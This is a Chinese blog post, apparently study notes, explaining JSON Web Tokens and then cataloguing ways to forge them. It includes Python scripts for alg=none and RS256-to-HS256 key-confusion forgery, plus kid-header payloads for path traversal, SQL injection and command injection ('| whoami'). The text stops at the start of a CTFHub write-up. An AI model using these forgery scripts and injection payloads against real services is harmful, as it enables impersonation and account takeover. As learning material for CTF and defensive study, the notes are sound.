<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>JWT以及jwt伪造</title>
    <url>/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/</url>
    <content><![CDATA[<p>  请移步正文</p>
<span id="more"></span>

<h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><h3 id="JWT简介"><a href="#JWT简介" class="headerlink" title="JWT简介"></a>JWT简介</h3><p>Json web token(JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519)。该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。<strong>JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源</strong>，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
<p><strong>作用:</strong></p>
<ol>
<li><strong>授权</strong>:<em>一旦用户登录，每个后续请求将包含JWT，从而允许用户访问该令牌允许的路由、服务和资源</em>。它的开销很小并且可以在不同的域使用。如：单点登录。</li>
<li><strong>信息交换</strong>：在各方之间安全地传输信息。JWT可进行签名（如使用公钥&#x2F;私钥对），因此可确保交换双方信息的正确。由于前面是使用表头和有效负载计算的，因此还可验证内容是否被篡改。</li>
</ol>
<h3 id="传统session认证"><a href="#传统session认证" class="headerlink" title="传统session认证"></a>传统session认证</h3><h4 id="认证方式"><a href="#认证方式" class="headerlink" title="认证方式"></a>认证方式</h4><p><strong>http协议本身是一种无状态的协议，</strong>即使用户向服务器提供了用户名和密码来进行用户认证，在下次请求时用户也得再一次进行用户认证。<em>因为根据http协议，服务器并不能知道接收到的请求来自哪个用户</em>，所以为了让应用能识别是哪个用户发出的请求，只能在服务器存储─份用户登录的信息，<u>这份登录信息会在响应时传递给浏览器，告诉其保存为cookie以便下次请求时发送给应用。这样应用就能识别请求来自哪个用户。</u></p>
<p><a href="https://www.51cto.com/article/679219.html">cookie与session区别</a></p>
<h4 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h4><ol>
<li>用户经改应用认证后，应用都要在服务端存储一份session。而session一般都是保存在内存中，随着认证用户的增多，<strong>服务端的开销会明显增大</strong>。而且用户下次的请求还必须发送到这台服务器上，这样才能拿到授权的资源。<strong>在分布式应用上相应的限制了负载均衡器的能力。这也意味着限制了应用的扩展能力</strong></li>
<li>session是基于cookie来进行用户识别，cookie如果被截获，用户很容易受到<strong>CSRF（跨站伪造请求攻击)攻击</strong>。</li>
</ol>
<h3 id="基于token的鉴权机制"><a href="#基于token的鉴权机制" class="headerlink" title="基于token的鉴权机制"></a>基于token的鉴权机制</h3><p>基于token的鉴权机制类似于http协议也是无状态的，<strong>它不需要去保留用户的认证信息或者会话信息</strong>，这就意味着基于token认证机制的应用不需要去考虑用户在哪一台服务器登录了，这就为应用的扩展提供了便利。</p>
<p>流程上是这样的：</p>
<pre><code>用户使用用户名密码来请求服务器
服务器进行验证用户的信息
服务器通过验证发送给用户一个token
客户端存储token，并在每次请求时附送上这个token值
服务端验证token值，并返回数据
</code></pre>
<p>这个token必须要在每次请求时传递给服务端，它应该保存在请求头里， 另外，服务端要支持CORS(跨来源资源共享)策略，一般我们在服务端这么做就可以了Access-Control-Allow-Origin: *。</p>
<h3 id="JWT认证"><a href="#JWT认证" class="headerlink" title="JWT认证"></a>JWT认证</h3><h4 id="JWT原理"><a href="#JWT原理" class="headerlink" title="JWT原理"></a>JWT原理</h4><p>服务器认证以后，申城一个JSON对象，发回给用户，类似下面这个数据结构:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;姓名&quot;: &quot;张三&quot;,</span><br><span class="line">  &quot;角色&quot;: &quot;管理员&quot;,</span><br><span class="line">  &quot;到期时间&quot;: &quot;2018年7月1日0点0分&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以后，<strong>用户与服务端通信的时候，都要发回这个 JSON 对象</strong>。<em>服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名。</em></p>
<p>在身份验证中，当用户使用他们的凭证成功登录时，JSON Web Token将被返回并且必须保存在<u>本地</u>（通常在本地存储中，但也可以使用Cookie），而不是在传统方法中创建会话服务器并返回一个cookie。</p>
<p><strong><u>这样服务器就不保存任何 session 数据了</u>，也就是说，服务器变成无状态了，从而比较容易实现扩展</strong>。</p>
<p>特点:</p>
<ul>
<li>三部分组成，每一部分都进行字符串的转化</li>
<li><strong>解密的时候没有使用数据库，仅仅使用的是secret进行解密（减小服务器资源压力）</strong></li>
<li>Jwt使用的secret千万不能丢失</li>
</ul>
<h4 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h4><ol>
<li><strong>前端通过WEB表单将自己的用户名和密码发送到后端的接口</strong>。改过程一般是HTTP的post请求。建议的方式是通过SSL加密的传输(https协议)，从而避免敏感信息被嗅探。</li>
<li><u>后端核对用户名和密码成功后，将用户的id等其他信息作为JWT Payload(负载)，将其与头部分别进行Base64编码拼接后签名，形成一个JWT(Token)。</u></li>
<li><em>后端将IWT字符串作为登录成功的返回结果范围给前端。前段可以将返回的结果保存在localStorage（浏览器本地缓存）或sessionStorage（session缓存）上</em>，退出登录时前端删除保存的JWT。</li>
<li>前端在每次请求时将JWT放入HTTP的Header中的<strong>Authorization</strong>位。(解决XSS和XSRF问题）<br>后端检查是否存在，如存在验证JWT的有效性。例如，检查签名是否正确﹔检查Token是否过期;检查Token的接收方是否是自己(可选）</li>
<li>验证通过后后端使用JWT中包含的用户信息进行其他逻辑操作，返回相应结果</li>
</ol>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/v2-b034c3453cd2bb7177cfdbb4366a5e73_720w-1713610643655-1.webp" alt="img"></p>
<h6 id="token验证方法："><a href="#token验证方法：" class="headerlink" title="token验证方法："></a><strong>token验证方法：</strong></h6><p>验证流程:</p>
<ul>
<li>在头部信息中声明加密算法和常量，然后把header使用json转化为字符串</li>
<li>在载荷中声明用户信息，同时还有一些其他的内容，再次使用json把在和部分进行转化，转化为字符串</li>
<li>使用在header中声明的加密算法来进行加密，把第一部分字符串和第二部分的字符串结合和每个项目随机生成的secret字符串进行加密，生成新的字符串，此字符串是独一无二的</li>
<li><strong>解密的时候，只要客户端带着jwt来发起请求，服务端就直接使用secret进行解密，解签证解出第一部分和第二部分，然后比对第二部分的信息和客户端传过来的信息是否一致。如果一致验证成功，否则验证失败。</strong></li>
</ul>
<h3 id="JWT结构"><a href="#JWT结构" class="headerlink" title="JWT结构"></a>JWT结构</h3><p>JWT是一个stringt字符串，一般三部分组成，中间用<code>.</code>隔开。举个例子:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span><br></pre></td></tr></table></figure>

<p>第一部分是头部(Header)，第二部分是有效载荷(Payload)，第三部分是签名(Signature)。</p>
<p><img src="/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
<p>可以使用<a href="https://jwt.io/#encoded-jwt">在线工具</a>，进行JWT解密</p>
<h4 id="头部-Header"><a href="#头部-Header" class="headerlink" title="头部(Header)"></a>头部(Header)</h4><p>头部包含两部分信息:</p>
<ul>
<li>声明类型</li>
<li>声明加密的算法也就是签名算法。</li>
</ul>
<p>完整的头部如下JSON：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后将头部进行base64加密，构成第一部分。</p>
<p><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</code></p>
<ul>
<li><p>alg属性表示token签名的算法(algorithm)，<strong>最常用的为HMAC和RSA算法</strong></p>
</li>
<li><p>typ属性表示这个token的类型（type）<strong>，JWT 令牌统一写为JWT。</strong></p>
</li>
</ul>
<p><strong><u>注意：</u>可以将JWT中的alg算法修改为none,JWT将算法设定为“None”。如果<code>alg</code>字段设为<code>None</code>，那么JWT的第三部分会被质控，这样任何token都是有效的。遮掩就可以伪造token进行随意访问</strong></p>
<h4 id="有效载荷"><a href="#有效载荷" class="headerlink" title="有效载荷"></a>有效载荷</h4><p>包含3部分信息：</p>
<ul>
<li>标准中注册的声明</li>
<li>公共的声明</li>
<li>私有的声明</li>
</ul>
<p><strong>1.标准中注册的声明</strong></p>
<p><u>JWT规定了7个官方字段，这些是一组预定义的claims，非强制性的，供选用。</u></p>
<ul>
<li>iss(issuer): jwt签发者</li>
<li>sub(subject): jwt所面向的用户</li>
<li>aud(audience): 接收jwt的一方</li>
<li>exp(expiration time): jwt的过期时间，这个过期时间必须要大于签发时间</li>
<li>nbf(Not Before): 定义在什么时间之前，该jwt都是不可用的.</li>
<li>iat(Issued At): jwt的签发时间</li>
<li>jti(JWT ID): jwt的唯一身份标识，主要用来作为一次性token，从而回避重放攻击。</li>
</ul>
<p><strong>2.公共的声明</strong></p>
<p>公共的声明可以随意定义。自定义claims，注意不要和JWT注册表中属性冲突，这里可以查看JWT注册表，一般添加用户的相关信息或其他业务需要的必须要信息。但不建议添加敏感信息，因为该部分在客户端可解密。</p>
<p><strong>3.私有的声明</strong></p>
<p>这些是自定义的claims，用于在同意使用这些claims的各方之间共享信息，它们既不是Registered claims，也不是Public claims。 </p>
<p>如下定义一个payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;iss&quot;: &quot;http://localhost:8000/auth/login&quot;,</span><br><span class="line">  &quot;iat&quot;: 1451888119,</span><br><span class="line">  &quot;exp&quot;: 1454516119,</span><br><span class="line">  &quot;nbf&quot;: 1451888119,</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class="line">  &quot;admin&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再将其进行base64加密，得到JWT第二部分:<br><code>eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</code></p>
<p><strong>注意：JWT默认是不对Payload加密的</strong>，也就意味着任何人都可以读到这部分JSON的内容，所以不要将私密的信息放在这个部分。</p>
<h4 id="签证-Signature"><a href="#签证-Signature" class="headerlink" title="签证(Signature)"></a>签证(Signature)</h4><ul>
<li>base64加密后的header</li>
<li>base64加密后的payload</li>
<li>密钥secret</li>
</ul>
<p>签名是为了防止数据篡改。</p>
<p>这个部分需要base64加密后的header和Base64加密后的payload使用<code>.</code>连接组成的自妇产，然后通过header中声明的加密方式进行加盐组合加密，然后构成了jwt的第三部分。按照下面的公式产生签名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// javascript</span><br><span class="line">var encodedString = base64UrlEncode(header) + &#x27;.&#x27; + base64UrlEncode(payload);</span><br><span class="line"></span><br><span class="line">var signature = HMACSHA256(encodedString, &#x27;secret&#x27;);</span><br></pre></td></tr></table></figure>

<p><strong>secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证</strong>，所以，它就是你服务端的<strong>私钥</strong>，只有服务器才知道，在任何场景都不应该流露出去。一旦客户端得知这个secret，那就意味着客户端是可以自我签发jwt了。</p>
<p>算出签名以后，把Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用”点”（.）分隔，就可以返回给用户。</p>
<h3 id="通过JWT进行认证"><a href="#通过JWT进行认证" class="headerlink" title="通过JWT进行认证"></a>通过JWT进行认证</h3><p><strong>客户端接收服务器返回的JWT，将其存储在Cookie或localStorage中</strong>。此后，<strong>客户端将在与服务器交互中都会带JWT</strong>。<em>如果将它存储在Cookie中，就可以自动发送，但是不会跨域</em>，<strong>因此一般是将它放入HTTP请求的Header Authorization字段中</strong>。<em>当跨域时，也可以将JWT被放置于POST请求的数据主体中。</em></p>
<p>服务器每次收到信息都会对它的前两部分进行加密，然后比对加密后的结果是否跟客户端传送过来的第三部分相同，如果相同则验证通过，否则失败。</p>
<p>一般是在请求头里加入Authorization，并加上Bearer标注：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fetch(&#x27;api/user/1&#x27;, &#123;</span><br><span class="line">  headers: &#123;</span><br><span class="line">    &#x27;Authorization&#x27;: &#x27;Bearer &#x27; + token</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>服务端会验证token，如果验证通过就会返回相应的资源。</p>
<h2 id="JWT伪造"><a href="#JWT伪造" class="headerlink" title="JWT伪造"></a>JWT伪造</h2><p>参考文章:</p>
<p><code>https://www.cnblogs.com/tomyyyyy/p/15134420.html#jwt%E7%9A%84%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9</code></p>
<p><code>https://cloud.tencent.com/developer/article/1552824</code></p>
<p><strong>JWT的安全问题一般有以下几种:</strong></p>
<ul>
<li>修改算法为none</li>
<li>修改算法从RS256到HS256</li>
<li>密钥泄露导致信息泄露</li>
<li>爆破密钥</li>
</ul>
<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><h5 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h5><p>这里有几种读数据的方法</p>
<p><strong>Linux</strong> <strong>base64工具（带有-d标志用于解码）：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ echo eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 | base64 -d</span><br><span class="line"> &#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>浏览器JavaScript控制台：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&gt;&gt; <span class="title function_">atob</span>(<span class="string">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9&quot;</span>)</span><br><span class="line"> <span class="string">&quot;&#123;&quot;</span>typ<span class="string">&quot;:&quot;</span><span class="variable constant_">JWT</span><span class="string">&quot;,&quot;</span>alg<span class="string">&quot;:&quot;</span><span class="title class_">HS256</span><span class="string">&quot;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>Powershell:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\&gt; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9&quot;))</span><br><span class="line">&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Pyhton:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(base64.b64decode(<span class="string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9&#x27;</span>))</span><br><span class="line">&#123;<span class="string">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span>,<span class="string">&quot;alg&quot;</span>:<span class="string">&quot;HS256&quot;</span>&#125;</span><br></pre></td></tr></table></figure>



<h5 id="将算法改为none"><a href="#将算法改为none" class="headerlink" title="将算法改为none"></a>将算法改为none</h5><p><strong>JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么签名会被置空，这样任何token都是有效的。</strong></p>
<p>设定该功能的最初目的是为了方便调试。但是，如果<strong>在生产环境中开启了空加密算法，缺少签名算法，jwt保证信息不被篡改的功能就失效了</strong>，<u>若不在生产环境中关闭该功能，攻击者可以通过将alg字段设置为“None”来伪造他们想要的任何token，接着便可以使用伪造的token冒充任意用户登陆网站。</u>，所以，使用这个方法的前提是有这个功能。</p>
<p><strong>注意:<a href="https://jwt.io/#encoded-jwt">jwt.io</a>网站不能直接修改算法为none</strong>，会被认为是恶意行为，因此无法使用在线工具生成JWT，但是这里有个python脚本应该可以用，后面实验一下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import jwt</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    &quot;alg&quot;: &quot;none&quot;,</span><br><span class="line">    &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">content = &#123;</span><br><span class="line">    &quot;iss&quot;: &quot;admin&quot;,</span><br><span class="line">    &quot;iat&quot;: 1667822180,</span><br><span class="line">    &quot;exp&quot;: 1667829380,</span><br><span class="line">    &quot;nbf&quot;: 1667822180,</span><br><span class="line">    &quot;sub&quot;: &quot;admin&quot;,</span><br><span class="line">    &quot;jti&quot;: &quot;237410127e2551647730b97941cdcae5&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">    content,</span><br><span class="line">    &quot;&quot;, # 密钥，此处置为空</span><br><span class="line">    algorithm=&quot;none&quot;, # 加密方式</span><br><span class="line">    headers=header</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">print(token)</span><br><span class="line"></span><br><span class="line">//注意：使用脚本只会生成两段字符串，虽然签名字符串为空，但是那个连接的点是必要的，可以看看下面ctfhub的例子</span><br></pre></td></tr></table></figure>

<p>应该还可以使用<strong>jwt_tool工具</strong>来改</p>
<p>将生成的字符串再上传，如果页面返回有效，那么说明存在漏洞。</p>
<h5 id="密钥混淆攻击"><a href="#密钥混淆攻击" class="headerlink" title="密钥混淆攻击"></a>密钥混淆攻击</h5><h6 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h6><p><strong>JWT最常用的两种算法是HMAC和RSA</strong>。HMAC（对称加密算法）用同一个密钥对token进行签名和认证（加密和解密）。而RSA（非对称加密算法）需要两个密钥，<strong>加密方用私钥加密，并把公钥告诉解密方用于解密</strong>。</p>
<p>再详细一些的两种加密格式上的区别:</p>
<ul>
<li>HMAC加密(对称加密)：正如上方生成签名那里一样，所以HS256加密后的字符串格式就是前面最开始那个例子。</li>
<li>RSA加密(非对称加密)：更多的使用在签名的场景，也就是确认信息的发送者。<strong>通过私钥加密，发送到对端，对端通过公钥解密。</strong>格式主要区别在于第三部分内容有所不同，代码如下:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RSASHA256(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  </span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">...     // 此处是一个RSA密钥对的公钥</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">,</span><br><span class="line">  </span><br><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">...     // 此处是一个RSA密钥对的私钥</span><br><span class="line">-----END PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>认证服务放私钥进行签名，其他服务校验的时候，通过公钥验签。</p>
<p>参考:<code>https://www.xiaoyeshiyu.com/post/191e.html</code></p>
<p>——————</p>
<h6 id="如何利用："><a href="#如何利用：" class="headerlink" title="如何利用："></a>如何利用：</h6><p>结合两种密钥的描述，在HMAC和RSA算法中，都是使用私钥对<code>signature</code>字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token。</p>
<p><strong>如果使用的是RS256算法加密，此时可以将算法RS256修改为HS256（非对称密码算法&#x3D;&gt;对称密码算法）来攻击</strong>，过程如下：</p>
<p>在同时使用者两种算法时，如果本来传给客户端的JWT加密方式为RS256，<strong>这时将算法RS256改为HS256,后端代码会使用公钥作为秘密密钥，然后使用HS2562算法验证签名</strong>。<u>通常情况下密钥<code>pem</code>是无法获取到的，但是公钥<code>pub</code>却可以很容易通过某些途径读取到</u>，攻击者就可以修改header中算法为HS256，然后使用RSA公钥对数据进行签名</p>
<p><strong>防御方法</strong>就是不要同时使用两种算法</p>
<p>简单生Jwt的脚本()：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;&quot;&quot;-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz6rR8Hafw5UZquuWnmBO</span></span><br><span class="line"><span class="string">x0cqkv5UFmuhra0dbtI92yV2pvvSJo/157cn//rXm5C5t0jkYFNjy+YSKk0Pv9sD</span></span><br><span class="line"><span class="string">YtGB2BjE9bHyV7wroZ82V8a6YWaerPcOK3Jp2kPn1tUp93I0yGeNLZCFD0bOoIXJ</span></span><br><span class="line"><span class="string">8RixwtFVHjbRNu7f1x0BTpg51JfI5/r4HAbkjyako2JuVFMF77Kj9DdkWg+SfvYA</span></span><br><span class="line"><span class="string">IF/5Az5/0pjZT90CwgvMAuB6eLJ7b7XhGdLX9ttTgDpFzLIeCPNIK0PhF2qNMx0/</span></span><br><span class="line"><span class="string">XllkqXk4fPEPW/BaCfw6rasqsq3a+lSiLcb2QMHRJ39nQ12KiPb/m8AoILOulA3G</span></span><br><span class="line"><span class="string">pwIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">header = <span class="string">&#x27;&#123;&quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;HS256&quot;&#125;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;username&quot;: &quot;root&quot;, &quot;role&quot;: &quot;admin&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">encodeHBytes = base64.urlsafe_b64encode(header.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">encodeHeader = <span class="built_in">str</span>(encodeHBytes, <span class="string">&quot;utf-8&quot;</span>).rstrip(<span class="string">&quot;=&quot;</span>)</span><br><span class="line"></span><br><span class="line">encodePBytes = base64.urlsafe_b64encode(payload.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">encodePayload = <span class="built_in">str</span>(encodePBytes, <span class="string">&quot;utf-8&quot;</span>).rstrip(<span class="string">&quot;=&quot;</span>)</span><br><span class="line"></span><br><span class="line">token = (encodeHeader + <span class="string">&quot;.&quot;</span> + encodePayload)</span><br><span class="line">sig = base64.urlsafe_b64encode(hmac.new(<span class="built_in">bytes</span>(key, <span class="string">&quot;UTF-8&quot;</span>), token.encode(<span class="string">&quot;utf-8&quot;</span>), hashlib.sha256).digest()).decode(<span class="string">&quot;UTF-8&quot;</span>).rstrip(<span class="string">&quot;=&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(token + <span class="string">&quot;.&quot;</span> + sig)</span><br></pre></td></tr></table></figure>

<p>利用例题参考:</p>
<p><code>https://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/#Pastebin</code></p>
<p><code>https://eyesofgods.github.io/2019/05/22/iscc2019-web-wp/</code></p>
<h5 id="未校验签名"><a href="#未校验签名" class="headerlink" title="未校验签名"></a>未校验签名</h5><p>当用户端提交请求给应用程序，服务端<strong>可能</strong>没有对token签名进行校验，这样，攻击者便可以通过提供无效签名简单地绕过安全机制。</p>
<p>比如：</p>
<p>一个很好的例子是网站上的“个人资料”页面，因为我们只有在被授权通过有效的JWT进行访问时才能访问此页面，我们将重放请求并寻找响应的变化以发现问题。</p>
<p>此时就可以将代表身份声明改为admin，将重新生成的Token发给服务端效验，如访问页面正常，则说明漏洞存在。</p>
<h5 id="暴力破解密钥-工具"><a href="#暴力破解密钥-工具" class="headerlink" title="暴力破解密钥(工具)"></a>暴力破解密钥(工具)</h5><p><strong>爆破前提:</strong></p>
<ul>
<li>知悉JWT使用的加密算法</li>
<li>一段有效的、已知的token</li>
<li>签名用的密钥不复杂(弱密钥)</li>
</ul>
<p><em>HMAC签名密钥（例如HS256 &#x2F; HS384 &#x2F; HS512）使用对称加密，这意味着对令牌进行签名的密钥也用于对其进行验证</em>。由于签名验证是一个自包含的过程，因此可以测试令牌本身的有效密钥，而不必将其发送回应用程序进行验证。</p>
<p>因此，<strong>HMAC JWT破解是离线的</strong>，通过JWT破解工具可以爆破得到密钥。</p>
<p>很多工具都可以爆破，如**<a href="https://github.com/ticarpi/jwt_tool">jwt_tool</a>(使用这个工具需要有字典)或者<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>等工具都可以**。爆破出密钥后就可以直接在jwt.io在线工具伪造任意用户的token。</p>
<p><strong>但是在kali上要使用工具时要在py文件目录下使用。</strong></p>
<h5 id="密钥泄露"><a href="#密钥泄露" class="headerlink" title="密钥泄露"></a>密钥泄露</h5><p>假设无法暴力破解密钥，那么可能通过其他途径获取密码，如git信息泄露、目录遍历，任意文件读取、XXE漏洞等，从而伪造任意token签名。</p>
<h5 id="操纵KID"><a href="#操纵KID" class="headerlink" title="操纵KID"></a>操纵KID</h5><p>KID代表“密钥序号”（Key ID）。它是JWT头部的一个可选字段，开发人员可以用它标识认证token的某一密钥。</p>
<h6 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a><strong>目录遍历</strong></h6><p>由于KID通常用于从文件系统中检索密钥文件，因此，如果在使用前不清理KID，文件系统可能会遭到目录遍历攻击。这样，攻击者便能够在文件系统中指定任意文件作为认证的密钥。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;kid&quot;</span>: <span class="string">&quot;../../public/css/main.css&quot;</span>   <span class="comment">//使用公共文件main.css验证token</span></span><br></pre></td></tr></table></figure>

<p>例如，攻击者可以强行设定应用程序使用公开可用文件作为密钥，并用该文件给HMAC加密的token签名。</p>
<h6 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><strong>SQL注入</strong></h6><p><strong>KID也可以用于在数据库中检索密钥</strong>。在该情况下，攻击者很可能会利用SQL注入来绕过JWT安全机制。</p>
<p>如果可以在KID参数上进行SQL注入，攻击者便能使用该注入返回任意值。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;kid&quot;</span>:<span class="string">&quot;aaaaaaa&#x27; UNION SELECT &#x27;key&#x27;;--&quot;</span>  <span class="comment">//使用字符串&quot;key&quot;验证token</span></span><br></pre></td></tr></table></figure>

<p>上面这个注入会导致应用程序返回字符串必然为“ key”（因为数据库中不存在名为“ aaaaaaa”的密钥）。<strong>然后使用字符串“ key”作为密钥来认证token。</strong></p>
<p><strong>类似逻辑后端为：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sql=&quot;select * from table where kid=$kid&quot;</span><br></pre></td></tr></table></figure>

<p>如此我们就可以使用如上语句来使得查询出来的key作为密钥</p>
<p>参考<code>:https://zhuanlan.zhihu.com/p/37305980</code></p>
<p>同样在HITB 2017中也存在一道，<a href="https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/">参考</a></p>
<h6 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a><strong>命令注入</strong></h6><p>有时，将KID参数直接传到不安全的文件读取操作可能会让一些命令注入代码流中。</p>
<p>一些函数就能给此类型攻击可乘之机，<strong>比如Ruby open（）</strong>。攻击者只需在输入的KID文件名后面添加命令，即可执行系统命令：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;key_file&quot;</span> | whoami;</span><br></pre></td></tr></table></figure>

<p>类似情况还有很多，这只是其中一个例子。理论上，每当应用程序将未审查的头部文件参数传递给类似system（），exec（）的函数时，都会产生此种漏洞。</p>
<h5 id="操纵头部参数"><a href="#操纵头部参数" class="headerlink" title="操纵头部参数"></a>操纵头部参数</h5><p>参考这个板块下的第二个文章，遇到搜</p>
<h4 id="相关题目wp"><a href="#相关题目wp" class="headerlink" title="相关题目wp"></a>相关题目wp</h4><h5 id="CTFHUB"><a href="#CTFHUB" class="headerlink" title="CTFHUB"></a>CTFHUB</h5><h6 id="敏感信息泄露-1"><a href="#敏感信息泄露-1" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h6><p>题目描述:JWT 的头部和有效载荷这两部分的数据是以明文形式传输的，如果其中包含了敏感信息的话，就会发生敏感信息泄露。试着找出FLAG。格式为 flag{}</p>
<p>————</p>
<p>打开即是一个登录页面，随便登录**(第一次登录没有token)**显示<code>where is flag</code>，抓包看看，在请求包得到一个jwt字符串，如下:</p>
